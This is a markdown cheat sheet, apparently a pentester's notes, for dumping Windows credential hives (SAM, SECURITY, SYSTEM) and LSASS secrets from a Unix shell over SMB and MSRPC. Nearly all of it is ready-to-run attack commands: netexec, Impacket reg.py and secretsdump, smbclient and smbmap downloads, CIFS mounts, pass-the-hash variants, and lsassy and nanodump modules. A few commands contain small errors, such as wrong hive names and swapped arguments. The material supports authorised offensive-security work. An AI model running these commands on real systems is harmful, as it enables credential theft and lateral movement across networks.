# Unix Shell

Search Tag(s): #post-exploitation #credential-access-and-dumping #network-protocols #msrpc #smb #staying-off-the-land #windows

## 01 - Manual Hashdump

### 1.1 - Search hive files

```
$ netexec smb <IP> -u <username> -H <nt_hash> [-d <domain> | --local-auth] --spider "C$" --spider-folder /Windows/System32/config/ --regex "(SAM|SECURITY|SYSTEM)"
```

### 1.2 - Enumerate hive files

Using `smbcacls` to enumerate the existing files.

```
$ cat << EOF > hive_files.txt
/Windows/System32/config/SAM
/Windows/System32/config/SECURITY
/Windows/System32/config/SYSTEM
/Windows/Repair/SAM
/Windows/Repair/SYSTEM
EOF

$ while read line; do echo "Hive filename: $line\n"; smbcacls -U "[<domain>/]<username>%<password>" //<IP>/C$ $line 2>/dev/null; done < hive_files.txt

$ while read line; do echo "Hive filename: $line\n"; smbcacls -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> //<IP>/C$ $line 2>/dev/null; done < hive_files.txt
```

Using `smbclient` to enumerate the existing files while enabling `showacls`.

```
smb: \> showacls

smb: \> ls /Windows/System32/config/SAM

smb: \> ls /Windows/System32/config/SECURITY

smb: \> ls /Windows/System32/config/SYSTEM
```

### 1.3 - Extract hive files

#### 1.3.1 - MSRPC Port

##### 1.3.1.1 - `net`

```
$ export IP="<target_IP>"
export PROTOCOL="<ads | rpc>"
export USERNAME="<username>"
export PASSWORD="<password>"
export DOMAIN="<DOMAIN>"
net $PROTOCOL registry save "HKLM\SAM" "C:\Windows\Temp\SAM" -U "$DOMAIN$USERNAME%$PASSWORD" -S $IP
net $PROTOCOL registry save "HKLM\SECURITY" "C:\Windows\Temp\SECURITY" -U "$DOMAIN$USERNAME%$PASSWORD" -S $IP
net $PROTOCOL registry save "HKLM\SYSTEM" "C:\Windows\Temp\SYSTEM" -U "$DOMAIN$USERNAME%$PASSWORD" -S $IP
```

Pass The Hash

```
$ export IP="<target_IP>"
export PROTOCOL="<ads | rpc>"
export USERNAME="<username>"
export NT_HASH="<nt_hash>"
export DOMAIN="<DOMAIN>"
net $PROTOCOL registry save "HKLM\SAM" "C:\Windows\Temp\SAM" -U "$DOMAIN$USERNAME" --pw-nt-hash $NT_HASH -S $IP
net $PROTOCOL registry save "HKLM\SAM" "C:\Windows\Temp\SECURITY" -U "$DOMAIN$USERNAME" --pw-nt-hash $NT_HASH -S $IP
net $PROTOCOL registry save "HKLM\SAM" "C:\Windows\Temp\SYSTEM" -U "$DOMAIN$USERNAME" --pw-nt-hash $NT_HASH -S $IP
```

##### 1.3.1.2 - Impacket

```
$ export IP="<target_IP>"
export USERNAME="<username>"
export PASSWORD="<password>"
reg.py "$USERNAME":"$PASSWORD"@$IP save -keyName "HKLM\SAM" -o "\\\\$IP\\c$\\windows\\temp\\"
reg.py "$USERNAME":"$PASSWORD"@$IP save -keyName "HKLM\SECURITY" -o "\\\\$IP\\c$\\windows\\temp\\"
reg.py "$USERNAME":"$PASSWORD"@$IP save -keyName "HKLM\SYSTEM" -o "\\\\$IP\\c$\\windows\\temp\\"
```

Pass The Hash

```
$ export IP="<target_IP>"
export USERNAME="<username>"
export NT_HASH="<nt_hash>"
reg.py "$USERNAME"@$IP -hashes :$NT_HASH save -keyName "HKLM\SAM" -o "\\\\$IP\\c$\\windows\\temp\\"
reg.py "$USERNAME"@$IP -hashes :$NT_HASH save -keyName "HKLM\SECURITY" -o "\\\\$IP\\c$\\windows\\temp\\"
reg.py "$USERNAME"@$IP -hashes :$NT_HASH save -keyName "HKLM\SYSTEM" -o "\\\\$IP\\c$\\windows\\temp\\"
```

#### 1.3.2 - SMB Port

##### 1.3.2.1 - `smbclient`

TODO: Modify the permissions with `smbcacls` in order to download them

```
$ smbclient -U "[<domain>/]<username>%<password>" //<IP>/C$ -c "get /Windows/System32/config/SAM; get /Windows/System32/config/SECURITY; get /Windows/System32/config/SYSTEM"

$ smbclient -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> //<IP>/C$ -c "get /Windows/System32/config/SAM; get /Windows/System32/config/SECURITY; get /Windows/System32/config/SYSTEM"
```

##### 1.3.2.2 - SMBMap

```
$ smbmap -u "<username>" -p "< <password> | <nt_hash> >" [-d <domain>] -H <IP> --download "C$\Windows\System32\config\SAM"

$ smbmap -u "<username>" -p "< <password> | <nt_hash> >" [-d <domain>] -H <IP> --download "C$\Windows\System32\config\SECURITY"

$ smbmap -u "<username>" -p "< <password> | <nt_hash> >" [-d <domain>] -H <IP> --download "C$\Windows\System32\config\SYSTEM"
```

##### 1.3.2.3 - NetExec

```
$ netexec smb <IP> -u <username> -p <password> [-d <domain> | --local-auth] --get-file /Windows/System32/config/SAM SAM

$ netexec smb <IP> -u <username> -p <password> [-d <domain> | --local-auth] --get-file /Windows/System32/config/SECURITY SECURITY

$ netexec smb <IP> -u <username> -p <password> [-d <domain> | --local-auth] --get-file /Windows/System32/config/SYSTEM SYSTEM
```

### 1.4 - Download hive files

#### 1.4.1 - `smbclient`

```
$ smbclient -U "[<domain>/]<username>%<password>" //<IP>/C$ -c "get /Windows/Temp/SAM SAM; get /Windows/Temp/SECURITY SECURITY; get /Windows/Temp/SYSTEM SYSTEM"

$ smbclient -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> //<IP>/C$ -c "get /Windows/Temp/SAM SAM; get /Windows/Temp/SECURITY SECURITY; get /Windows/Temp/SYSTEM SYSTEM"
```

#### 1.4.2 - SMBMap

```
$ smbmap -u "<username>" -p "< <password> | <nt_hash> >" [-d <domain>] -H <IP> --download "C$\Windows\Temp\SAM"

$ smbmap -u "<username>" -p "< <password> | <nt_hash> >" [-d <domain>] -H <IP> --download "C$\Windows\Temp\SECURITY"

$ smbmap -u "<username>" -p "< <password> | <nt_hash> >" [-d <domain>] -H <IP> --download "C$\Windows\Temp\SYSTEM"
```

#### 1.4.3 - NetExec

```
$ netexec smb <IP> -u <username> -p <password> [-d <domain> | --local-auth] --get-file /Windows/Temp/SAM SAM

$ netexec smb <IP> -u <username> -p <password> [-d <domain> | --local-auth] --get-file /Windows/Temp/SECURITY SECURITY

$ netexec smb <IP> -u <username> -p <password> [-d <domain> | --local-auth] --get-file /Windows/Temp/SYSTEM SYSTEM
```

### 1.4 - Parse hive files

#### 1.4.1 - Mount Remote SMB

Create a temporary folder for mounting an SMB share.

```
# mkdir /mnt/share
```

Mount SMB share with various authentication methods.

```
# mount -t cifs -o [domain=<domain>,]username=<username>,password=<password>,rw //<IP>/C$ /mnt/share

# smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw

# mount -t cifs -o [domain=<domain>,]username=<username>,password=<nt_hash>,sec=ntlmssp,rw //<IP>/C$ /mnt/share

# mount -t cifs -o sec=krb5,vers=3.0,rw '//<IP>/C$' /mnt/share
```

Harvest the credentials.

```
# secretsdump.py -sam /mnt/share/Windows/System32/config/SAM -system /mnt/share/Windows/System32/config/SYSTEM local

# secretsdump.py -sam /mnt/share/Windows/System32/config/SAM -security /mnt/share/Windows/System32/config/SYSTEM -system /mnt/share/Windows/System32/config/SECURITY local
```

If you have already downloaded the HIVE files. Then parse them with the fields.

```
$ secretsdump.py -sam /path/to/sam_hive_file -system /path/to/system_hive_file local

$ secretsdump.py -sam /path/to/sam_hive_file -security /path/to/security_hive_file -system /path/to/system_hive_file local
```

#### 1.4.2 - Impacket

```
$ secretsdump.py [<domain>/]<username>:<password>@<IP> [-exec-method <smbexec | wmiexec | mmcexec>] -use-remoteSSMethod

$ secretsdump.py [<domain>/]<username>@<IP> -hashes :<nt_hash> [-exec-method <smbexec | wmiexec | mmcexec>] -use-remoteSSMethod
```

## 02 - Automated Hashdump

### 2.1 - Impacket

```
$ secretsdump.py [<domain>/]<username>:<password>@<IP> [-exec-method <smbexec | wmiexec | mmcexec>]

$ secretsdump.py [<domain>/]<username>@<IP> -hashes :<nt_hash> [-exec-method <smbexec | wmiexec | mmcexec>]
```

### 2.2 - NetExec

```
$ netexec smb <IP> -u <username> -p <password> [-d <domain> | --local-auth] --sam

$ netexec smb <IP> -u <username> -p <password> [-d <domain> | --local-auth] --lsa

$ netexec smb <IP> -u <username> -p <password> [-d <domain> | --local-auth] -M lsassy

$ netexec smb <IP> -u <username> -p <password> [-d <domain> | --local-auth] -M nanodump
```

---
## References

- [Samdump2](https://salsa.debian.org/pkg-security-team/samdump2)

- [Wadcoms Impacket Secretsdump](https://wadcoms.github.io/wadcoms/Impacket-SecretsDump/)